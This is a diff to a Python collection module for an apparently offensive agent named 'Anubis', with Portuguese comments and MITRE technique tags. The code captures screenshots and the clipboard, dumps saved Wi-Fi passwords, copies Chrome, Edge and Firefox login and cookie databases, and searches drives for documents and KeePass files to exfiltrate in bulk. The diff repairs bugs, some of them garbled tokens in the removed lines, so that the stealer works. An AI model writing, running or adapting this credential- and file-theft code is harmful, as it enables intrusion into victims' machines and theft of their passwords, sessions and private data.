@@ -1,13 +1,14 @@
     def collection_ext(self, task_id, action="screenshot", path="",
-                       exts=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.,.rdp,.txt",
+                       exts=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
                        keywords="", browser="chrome", all_drives=False,
                        max_files=200, max_mb=50):
         # collection_ext — Anubis (MITRE TA0009 - Collection)
         # Retorna JSON: {"output": str, "files": [{"name": str, "b64": str}], "err": str}
-        import os, base64, json, time, shutil, subprocess, tempfile
+        # Imports dentro do método (o arquivo é spliced dentro da classe do agente).
+        import os, sys, json, time, base64, subprocess, tempfile
 
-        if platform.system() != 'Windows':
-            return json.dumps({"err": "collection_ext: implementado para Windows"})
+        def resp(out="", files=None, err=""):
+            return json.dumps({"output": out, "files": files or [], "err": err})
 
         def run(cmd, timeout=120):
             try:
@@ -17,15 +18,25 @@
                 return -1, str(e)
 
         def b64file(fp):
-            base64.b64encode(open(fp, "rb").read()).decode()
-        try:
-            with open(fp, "rb") as fh:
-                return base64.b64encode(fh.read()).decode()
-        except OSError:
-            return ""
+            try:
+                with open(fp, "rb") as fh:
+                    return base64.b64encode(fh.read()).decode()
+            except OSError:
+                return ""
 
-        def resp(out="", files=None, err=""):
-            return json.dumps({"output": out, "files": files or [], "err": err})
+        if sys.platform != 'win32':
+            return resp(err="collection_ext: implementado para Windows")
+
+        if isinstance(all_drives, str):
+            all_drives = all_drives.strip().lower() in ("1", "true", "yes", "sim")
+        try:
+            max_files = int(max_files)
+        except (TypeError, ValueError):
+            max_files = 200
+        try:
+            max_mb = int(max_mb)
+        except (TypeError, ValueError):
+            max_mb = 50
 
         tmp = tempfile.gettempdir()
         ts = time.strftime("%Y%m%d_%H%M%S")
@@ -45,7 +56,7 @@
                            "-ExecutionPolicy", "Bypass", "-Command", ps], timeout=90)
             data = b64file(shot)
             try:
-                os.remove(ToSOSTOCSnertify)
+                os.remove(shot)
             except OSError:
                 pass
             if rc == 0 and data:
@@ -68,7 +79,7 @@
                 return resp(out="[+] Clipboard (texto):\n" +
                                res.split("CLIP_TEXT|", 1)[1][:8000])
             if "CLIP_IMAGE" in res:
-                data = b64file(nd clip_img)
+                data = b64file(clip_img)
                 try:
                     os.remove(clip_img)
                 except OSError:
@@ -78,9 +89,9 @@
                                 files=[{"name": "clipboard_%s.png" % ts, "b64": data}])
             if "CLIP_EMPTY" in res:
                 return resp(out="[*] Clipboard vazio")
-            return resp(err="clipboard falhou: helper %s" % res[:300])
+            return resp(err="clipboard falhou: %s" % res[:300])
 
-        # ── WIFI (T1005) ───────────────────────────────────────────────────────
+        # ── WIFI (T1005) ──────────────────────────────────────────────────────
         if action == "wifi":
             rc, profiles = run(["netsh", "wlan", "show", "profiles"])
             if rc != 0:
@@ -98,16 +109,18 @@
                                 "Conteúdo da Chave" in l):
                             pwd = l.split(":", 1)[1].strip()
                     out.append("SSID: %-30s Senha: %s" % (name, pwd or "<aberta>"))
+            if not out:
+                return resp(out="[*] Nenhum perfil Wi-Fi encontrado")
             return resp(out="[+] %d perfil(es) Wi-Fi:\n%s" % (len(out), "\n".join(out)))
 
         # ── BROWSER (T1005/T1555.003) ─────────────────────────────────────────
         if action == "browser":
-            b = browser.lower().strip()
+            b = str(browser).lower().strip()
             local = os.environ.get("LOCALAPPDATA", "")
             roaming = os.environ.get("APPDATA", "")
             files = []
             if b == "firefox":
-                prof_root = os.path.join(roaming, r"Mozilla\Firefox\Profiles")
+                prof_root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
                 if os.path.isdir(prof_root):
                     for prof in os.listdir(prof_root):
                         for fn in ("places.sqlite", "cookies.sqlite", "logins.json",
@@ -120,11 +133,10 @@
                                                   (prof[:8], fn), "b64": data})
             elif b in ("chrome", "edge"):
                 base = os.path.join(
-                    local, (r"Google\Chrome\User Data\Default" if b == "chrome"
-                            else r"Microsoft\Edge\User Data\Default"))
-                for fn in ("History", "Bookmarks", "Cookies", "Login Data",
-                           "Web Data"):
-                    fp = os.path.save: os.path.isfile(fp)
+                    local, ("Google", "Chrome", "User Data", "Default") if b == "chrome"
+                    else ("Microsoft", "Edge", "User Data", "Default"))
+                for fn in ("History", "Bookmarks", "Cookies", "Login Data", "Web Data"):
+                    fp = os.path.join(base, fn)
                     if os.path.isfile(fp):
                         data = b64file(fp)
                         if data:
@@ -139,23 +151,23 @@
                      "cifrados DPAPI — decriptar no operador)" % (len(files), b)),
                 files=files)
 
-        # ── SEARCH (T1005) — só nomes, stealth ────────────────────────────────
+        # ── SEARCH (T1005) — só lista, stealth ────────────────────────────────
         if action == "search":
             roots = [path] if path else [os.path.expanduser("~")]
             if all_drives and not path:
                 roots = ["C:\\"] + [c + ":\\" for c in "DEFGHIJKLMNOPQRSTUVWXYZ"
                                     if os.path.exists(c + ":\\")]
-            ext_list = [e.strip().lower() for e in exts.split(",") if e.strip()]
-            kw = [k.lower() for k in keywords.split(",") if k.strip()]
+            ext_list = [e.strip().lower() for e in str(exts).split(",") if e.strip()]
+            kw = [k.lower() for k in str(keywords).split(",") if k.strip()]
             out = []
             for root in roots:
                 if not os.path.isdir(root):
                     continue
                 for dirpath, dirnames, filenames in os.walk(root, topdown=True):
-                    dirnames[:] = [d for d in dirnames if d not in
-                                   ("Windows", "Program Files",
-                                    "Program Files (x86)", "$Recycle.Bin")] \
-                                  if root.endswith(":\\") else dirnames
+                    if root.endswith(":\\"):
+                        dirnames[:] = [d for d in dirnames if d not in
+                                       ("Windows", "Program Files",
+                                        "Program Files (x86)", "$Recycle.Bin")]
                     for fn in filenames:
                         low = fn.lower()
                         if any(low.endswith(e) for e in ext_list) or \
@@ -165,10 +177,12 @@
                                 out.append("%10d  %s" % (os.path.getsize(fp), fp))
                             except OSError:
                                 pass
-                            if len(out) >= int(max_files):
+                            if len(out) >= max_files:
                                 break
-                    if len(out) >= int(max_files):
+                    if len(out) >= max_files:
                         break
+                if len(out) >= max_files:
+                    break
             if not out:
                 return resp(out="[*] Nenhum arquivo bateu com os criterios")
             return resp(out="[+] %d hit(s):\n%s" % (len(out), "\n".join(out)))
@@ -184,42 +198,48 @@
                         (path, (len(data) * 3) // 4),
                         files=[{"name": os.path.basename(path), "b64": data}])
 
-        # 7 ── MULTIGET (T1005) — exfiltra vários por critério ─────────────────
+        # ── MULTIGET (T1005) — exfiltra vários por critério ───────────────────
         if action == "multiget":
             roots = [path] if path else [os.path.expanduser("~")]
-            ext_list = [e.strip().lower() for e in exts.split(".")] if exts else []
-            ext_list = [e if e.startswith(".") else "." + e for e in ext_list]
-            kw = [k.lower() for k in keywords.split(",") if k.strip()]
-            limit = int(max_mb) * 1024 * 1024
+            ext_list = []
+            for e in str(exts).split(","):
+                e = e.strip().lower()
+                if not e:
+                    continue
+                if not e.startswith("."):
+                    e = "." + e
+                ext_list.append(e)
+            kw = [k.lower() for k in str(keywords).split(",") if k.strip()]
+            limit = max_mb * 1024 * 1024
             files, total = [], 0
             for root in roots:
                 if not os.path.isdir(root):
                     continue
                 for dirpath, dirnames, filenames in os.walk(root, topdown=True):
-                    dirnames[:] = [d for d in dirnames if d not in
-                                   ("Windows", "Program Files",
-                                    "Program Files (x86)", "$Recycle.Bin")] \
-                                  if root.endswith(":\\") else dirnames
+                    if root.endswith(":\\"):
+                        dirnames[:] = [d for d in dirnames if d not in
+                                       ("Windows", "Program Files",
+                                        "Program Files (x86)", "$Recycle.Bin")]
                     for fn in filenames:
                         low = fn.lower()
                         if not (any(low.endswith(e) for e in ext_list) or
-                                (kw and any(k in un link for k in kw))):
+                                (kw and any(k in low for k in kw))):
                             continue
                         fp = os.path.join(dirpath, fn)
                         try:
                             sz = os.path.getsize(fp)
                         except OSError:
                             continue
-                        if total + sz > limit or len(files) >= int(max_files):
+                        if total + sz > limit or len(files) >= max_files:
                             continue
                         data = b64file(fp)
                         if data:
-                            total += size
+                            total += sz
                             files.append({"name": os.path.basename(fp), "b64": data})
             if not files:
                 return resp(out="[*] Nada coletado (criterios/limite)")
             return resp(out="[+] %d arquivo(s) exfiltrado(s) (%d bytes)" %
                         (len(files), total), files=files)
 
-        return json.dumps({"err": "action invalida: screenshot | clipboard | "
-                                  "browser | wifi | search | get | multiget"})
+        return resp(err="action invalida: screenshot | clipboard | browser | "
+                        "wifi | search | get | multiget")
